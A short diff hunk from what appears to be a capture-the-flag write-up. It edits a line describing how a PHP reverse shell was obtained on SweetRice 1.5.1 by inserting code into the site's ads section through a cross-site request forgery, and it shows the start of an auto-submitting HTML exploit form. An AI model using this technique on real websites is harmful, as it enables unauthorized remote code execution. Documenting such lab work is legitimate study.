@@ -76,7 +76,7 @@ Found a vulnerability by using searchexploit (SweetRice 1.5.1 - Cross-Site Reque
 ![image](https://github.com/user-attachments/assets/890c43c5-f2f2-43a4-b6e2-ee1ea0587c61)
 
 
-Successfully gained php reverse shell by adding this command to the ads code and saving it in the website:
+Successfully gained php reverse shell by modifying it and adding it to the ads code and saving it in the website:
 ```
 <html>
 <body onload="document.exploit.submit();">
